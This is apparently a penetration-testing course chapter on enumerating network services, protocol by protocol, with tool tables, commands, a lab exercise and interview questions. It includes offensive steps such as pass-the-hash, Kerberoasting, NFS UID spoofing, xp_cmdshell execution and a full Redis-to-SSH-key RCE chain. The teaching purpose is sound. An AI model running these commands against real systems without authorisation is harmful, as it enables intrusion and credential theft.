# 🧰 Service Enumeration

> An open port is half the discovery; the **service** behind it is the other half. Each protocol has its own enumeration playbook — usernames, shares, configs, sometimes anonymous reads. This chapter is the reference you'll come back to during every engagement.

---

## 1. Why Enumeration Matters

Recon answers "what's there?" — enumeration answers "who's there, what can they read/write, and what credentials are accepted?" Most real intrusions begin with **anonymous or null-session enumeration** revealing internal usernames, shares, or SNMP community strings.

The pattern is identical for every protocol:

1. **Connect anonymously** — most services allow some unauth interaction.
2. **List things** — users, shares, MIBs, queues, databases, repositories.
3. **Read what you can** — public files, system info, configuration.
4. **Try common creds** — `admin:admin`, `root:root`, vendor defaults.
5. **Brute / spray with care** — only with ROE permission.

---

## 2. SMB / NetBIOS (139, 445)

The single highest-yield protocol on Windows networks.

### 2.1 Tools

| Tool | Job |
|---|---|
| `smbclient` | List shares, read files |
| `enum4linux-ng` | All-in-one Linux/SMB enum |
| `nmap --script smb-*` | Tons of NSE scripts |
| `crackmapexec` / `nxc` (NetExec) | Modern, multi-protocol |
| `rpcclient` | MS-RPC over SMB; powerful |
| `impacket-smbclient.py` / `smbexec.py` | Python tooling |

### 2.2 Anonymous / null-session enumeration

```bash
# List shares
smbclient -L //10.0.0.5 -N
crackmapexec smb 10.0.0.5 -u '' -p '' --shares
nxc smb 10.0.0.5 -u '' -p ''

# Domain & user enumeration via RPC
enum4linux-ng -A 10.0.0.5
rpcclient -U "" -N 10.0.0.5
> srvinfo
> enumdomusers
> enumdomgroups
> querydominfo
> getdompwinfo            # password policy!
```

`getdompwinfo` returning a 5-character minimum and no lockout is a free password-spraying license (with ROE).

### 2.3 Authenticated

```bash
crackmapexec smb 10.0.0.0/24 -u alice -p Summer2026 --shares
nxc smb 10.0.0.0/24 -u alice -p Summer2026 --loggedon-users
nxc smb 10.0.0.0/24 -u alice -p Summer2026 --pass-pol
nxc smb 10.0.0.0/24 -u alice -H <NTLM_HASH> --shares  # pass-the-hash
```

`nxc` (NetExec, the maintained fork of CrackMapExec) is the swiss-army knife of SMB.

### 2.4 NSE goldmine

```bash
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-protocols \
     -p 139,445 10.0.0.5

nmap --script "smb-vuln-*" -p 445 10.0.0.5    # MS17-010, MS08-067, etc.
```

### 2.5 SMB signing & relay

`nxc smb 10.0.0.0/24 --gen-relay-list relay.txt` finds hosts where SMB signing is *not* required → those become relay targets in the offensive phase (`ntlmrelayx.py`).

---

## 3. LDAP / Active Directory (389, 636, 3268, 3269)

LDAP is the directory service for AD. Even unauthenticated, you can often read the schema and basic info.

### 3.1 Anonymous bind

```bash
ldapsearch -x -H ldap://10.0.0.5 -s base                         # rootDSE
ldapsearch -x -H ldap://10.0.0.5 -b "" -s base namingContexts
ldapsearch -x -H ldap://10.0.0.5 -b "DC=corp,DC=local" -s sub '(objectClass=user)' sAMAccountName
```

Anonymous binds are rarer in modern AD, but rootDSE info often leaks the domain controller's hostname, OS, and naming contexts.

### 3.2 Authenticated enumeration

```bash
# windapsearch — Linux tool that mimics Microsoft tooling
windapsearch --dc-ip 10.0.0.5 -u 'alice@corp.local' -p Summer2026 -U
windapsearch --dc-ip 10.0.0.5 -u 'alice@corp.local' -p Summer2026 -G
windapsearch --dc-ip 10.0.0.5 -u 'alice@corp.local' -p Summer2026 --da

# nxc / nxc ldap
nxc ldap 10.0.0.5 -u alice -p Summer2026 --users
nxc ldap 10.0.0.5 -u alice -p Summer2026 --asreproast asrep.txt
nxc ldap 10.0.0.5 -u alice -p Summer2026 --kerberoasting kerb.txt

# BloodHound's SharpHound (offensive ingestor) or bloodhound.py (passive Python)
bloodhound.py -u alice -p Summer2026 -d corp.local -dc dc.corp.local -c All
```

We ship `scripts/recon/ad_ldap_recon.py` — a read-only LDAP enumerator that pulls users, groups, GPOs, computers, password policy, ASREPRoastable accounts, and Kerberoastable SPNs into a single JSON report.

### 3.3 What to look for

- **DescriptionField on user objects** — admins routinely store passwords there ("temp pwd: Welcome2024!")
- **`servicePrincipalName` on user accounts** — Kerberoastable
- **`UserAccountControl` flags** — `DONT_REQUIRE_PREAUTH` → ASREPRoast
- **`adminCount=1`** — current/historical privileged users
- **`pwdLastSet`** — stale accounts
- **Group membership chains** — feed to BloodHound for graph analysis

---

## 4. SNMP (161/UDP)

SNMP v1/v2c is **plaintext**, **community-string-authenticated**, and routinely left at default `public` / `private`.

```bash
# Test community
nmap -sU -p 161 --script snmp-brute 10.0.0.5
onesixtyone -c communities.txt -i targets.txt

# Walk the MIB
snmpwalk -v2c -c public 10.0.0.5 .1
snmpwalk -v2c -c public 10.0.0.5 1.3.6.1.4.1.77.1.2.25  # Windows users (legacy)
snmpwalk -v2c -c public 10.0.0.5 1.3.6.1.2.1.25.4.2     # running processes
snmpwalk -v2c -c public 10.0.0.5 1.3.6.1.2.1.6.13       # TCP connection table
snmpwalk -v2c -c public 10.0.0.5 1.3.6.1.4.1.9          # Cisco config (often!)
```

Cisco devices with **read-write** community strings (`private`) → you can exfiltrate the running config. SNMPv3 fixes most of this with proper auth, but legacy gear is everywhere.

`snmp-check` and `snmpenum.pl` give human-readable summaries.

---

## 5. NFS (2049, plus 111 portmapper)

Network File System. v3 commonly runs without authentication; v4 has Kerberos but is often misconfigured.

```bash
showmount -e 10.0.0.5                        # list exports
rpcinfo -p 10.0.0.5                          # what RPC services are exposed

mkdir /mnt/nfs && sudo mount -t nfs 10.0.0.5:/exports /mnt/nfs -o vers=3,nolock
ls -la /mnt/nfs

# UID-mapping bypass — NFS trusts the client's UID
sudo useradd -u 1000 ineeduid
sudo -u ineeduid ls /mnt/nfs/user1234        # appears as user1234 on the server
```

`no_root_squash` exports + write access = full server compromise via dropped SUID binary. Look for it in `/etc/exports`.

---

## 6. SMTP (25, 465, 587)

```bash
nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay 10.0.0.5

# Manual user enum (legacy servers)
nc 10.0.0.5 25
HELO scan
VRFY root
VRFY alice
EXPN postmaster

# swaks for end-to-end testing
swaks --to victim@target.com --from sender@evil.com --server mx.target.com
```

Open relays are mostly extinct; **user enumeration** still works on misconfigured servers and is a precursor to phishing.

For phishing prep, also check:
- SPF / DKIM / DMARC on the sending domain (`dig +short TXT _dmarc.target.com`)
- Mailbox vendor (`dig MX target.com` → `aspmx.l.google.com` ⇒ Workspace; `*.outlook.com` ⇒ M365)

---

## 7. FTP (21)

```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor 10.0.0.5

ftp 10.0.0.5
> user anonymous
> pass anonymous@x.com
> ls -la

# Or modern:
curl -s ftp://anonymous:any@10.0.0.5/
```

**Anonymous FTP with writable directories** = malware drop, data exfil staging, or initial-foothold redirector.

`vsftpd 2.3.4` has a famous backdoor; `ftp-vsftpd-backdoor` script will check it. Modern servers usually don't, but legacy embedded gear (printers, NAS) often do.

---

## 8. SSH (22)

```bash
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,sshv1 10.0.0.5

# Banner version → CVE pivots
ssh -o StrictHostKeyChecking=no admin@10.0.0.5

# Version-specific user enumeration (CVE-2018-15473) — old OpenSSH
python3 sshUserEnum.py -L users.txt 10.0.0.5

# Authentication methods discovery
ssh -v admin@10.0.0.5 2>&1 | grep "authentications that can continue"
# → publickey,password,keyboard-interactive
```

Spray attacks against SSH are detected fast (`fail2ban`, AllowUsers, MaxAuthTries). Save it for legitimate engagements with explicit ROE.

---

## 9. RDP (3389)

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info 10.0.0.5
# rdp-ntlm-info leaks: NetBIOS name, DNS name, OS version

xfreerdp /v:10.0.0.5 /u:alice /p:Summer2026
nxc rdp 10.0.0.5 -u alice -p Summer2026
```

BlueKeep (CVE-2019-0708, MS17-010-style RDP) was the famous one. `rdp-vuln-ms12-020` covers the old one; modern hosts mostly patched.

For pre-auth recon, `rdp-ntlm-info` discloses the hostname and domain — handy for password-spray campaigns later.

---

## 10. MSSQL (1433)

```bash
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config 10.0.0.5

# nxc / nxc mssql
nxc mssql 10.0.0.5 -u sa -p '' --query "SELECT @@version"
nxc mssql 10.0.0.5 -u alice -p Summer2026 --local-auth -M mssql_priv

# Manual via mssqlclient.py (impacket)
impacket-mssqlclient -windows-auth corp/alice:Summer2026@10.0.0.5
SQL> EXEC xp_cmdshell 'whoami'         # if enabled, instant RCE
```

MSSQL with `xp_cmdshell` enabled and `sa` creds = SYSTEM on the host. Modern installs disable it by default; older deployments forget.

---

## 11. Redis (6379)

```bash
nc 10.0.0.5 6379
> INFO
> CONFIG GET *
> KEYS *
```

**Unauth Redis on the public internet** is a meme-tier finding (Shodan: `port:6379 -authentication`). It happens *constantly*. With write access:

```bash
# RCE via SSH key write (if Redis runs as a user with .ssh)
redis-cli -h 10.0.0.5 config set dir /home/redis/.ssh/
redis-cli -h 10.0.0.5 config set dbfilename authorized_keys
echo -e "\n\nssh-rsa AAAA... attacker\n\n" | redis-cli -h 10.0.0.5 -x set crackit
redis-cli -h 10.0.0.5 save
ssh -i id_rsa redis@10.0.0.5
```

Same trick works for crontab, `/etc/passwd`, web shells, etc. **Bind Redis to localhost; require auth.**

---

## 12. NetBIOS Name Service (137, 138)

Often combined with SMB enumeration, but standalone:

```bash
nbtscan 10.0.0.0/24                 # name → IP mapping, MAC, role
nmap -sU -p 137 --script nbstat 10.0.0.5
```

NetBIOS names reveal computer roles (`<00>` workstation, `<20>` server, `<1B>` PDC).

---

## 13. Other High-Value Ports

| Port | Service | First-step enum |
|---|---|---|
| 53 | DNS | `dig AXFR @ns.target.com target.com` (zone transfer) |
| 79 | Finger | `finger user@10.0.0.5` (rare; legacy Unix) |
| 110 | POP3 | `nc 10.0.0.5 110; USER admin; PASS admin` |
| 143 | IMAP | `nc 10.0.0.5 143; A LOGIN admin admin` |
| 389/636 | LDAP/LDAPS | See §3 |
| 512–514 | rsh/rlogin/rexec | Legacy Unix; trust auth |
| 1099 | Java RMI | `nmap --script rmi-dumpregistry,rmi-vuln-classloader` |
| 1521 | Oracle | `odat`, `tnscmd10g` |
| 2375 | Docker API | `curl http://10.0.0.5:2375/containers/json` |
| 2379 | etcd | Cluster takeover with unauth API |
| 5984 | CouchDB | `/_utils/`, `/_all_dbs` |
| 6443 | Kubernetes API | `kubectl --insecure-skip-tls-verify` |
| 8080 | Tomcat manager | `curl http://10.0.0.5:8080/manager/html` |
| 9200 | Elasticsearch | `curl http://10.0.0.5:9200/_cluster/state` |
| 11211 | Memcached | `nc 10.0.0.5 11211; stats` |
| 27017 | MongoDB | `mongo 10.0.0.5/admin --eval "db.runCommand({listDatabases:1})"` |

---

## 14. Hands-On Lab

In your isolated lab (Metasploitable2 / Metasploitable3 / vulnerable AD lab):

1. nmap the target with `-sV -sC` against all open ports.
2. For each interesting port, run the protocol-specific tools above.
3. Document **anonymous access**, **default credentials**, and **information disclosure** separately.
4. Try BloodHound on the AD lab and walk through the attack paths it suggests.
5. Run `nxc smb <range> --gen-relay-list relay.txt` and see how many hosts allow relay.

Time: 4–6 hours. This is the meat of OSCP-style lab work.

---

## 15. Interview Questions

- What's a null SMB session and what can you do with one?
- Walk through enumerating an AD environment from "I have one valid user" to "I have a graph of attack paths."
- How does SNMP v1/v2c authenticate? What does v3 add?
- Why is `no_root_squash` dangerous on an NFS export?
- How would you discover whether SMB signing is required on a network?
- What does Kerberoasting require to work, and how would you enumerate Kerberoastable accounts read-only?

---

## 16. Tools Quick Reference

| Protocol | Top tools |
|---|---|
| SMB | `smbclient`, `enum4linux-ng`, `nxc smb`, `rpcclient`, `impacket` |
| LDAP/AD | `windapsearch`, `nxc ldap`, `bloodhound.py`, `ldapsearch` |
| SNMP | `onesixtyone`, `snmpwalk`, `snmp-check` |
| NFS | `showmount`, `rpcinfo`, `nfs-ls` |
| SMTP | `swaks`, `nmap smtp-*`, manual `nc` |
| FTP | `ftp`, `curl ftp://` |
| SSH | `ssh -v`, version-specific user-enum scripts |
| RDP | `xfreerdp`, `nxc rdp`, `rdesktop` |
| MSSQL | `impacket-mssqlclient`, `nxc mssql` |
| Redis | `redis-cli`, raw `nc` |
| Kubernetes | `kubectl`, `kube-hunter` |
| Docker | `curl :2375/...`, `docker -H tcp://...` |

---

## 17. Further Reading

- `nxc` (NetExec) docs — read every module page
- `enum4linux-ng` README
- HackTricks (book.hacktricks.wiki) — the unofficial bible for service enumeration
- *The Hacker Playbook 3*, Peter Kim
- OSCP-prep blogs on Metasploitable2 / vulnhub walkthroughs

---

[← Network Scanning](scanning.md) · [Vulnerability Assessment →](vulnerability-assessment.md)
